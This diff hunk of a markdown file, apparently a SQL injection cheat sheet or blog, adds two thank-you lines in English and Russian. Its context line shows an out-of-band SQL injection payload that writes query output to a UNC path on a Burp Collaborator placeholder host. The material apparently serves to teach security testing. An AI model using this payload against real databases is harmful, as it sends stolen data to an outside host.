@@ -327,6 +327,11 @@ SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
 ```
 
 
+**Grateful for your time—thank you for reading this blog to the end.**
+
+**пасибо, друг, за то, что читаешь блог.**
+
+
 
 
 
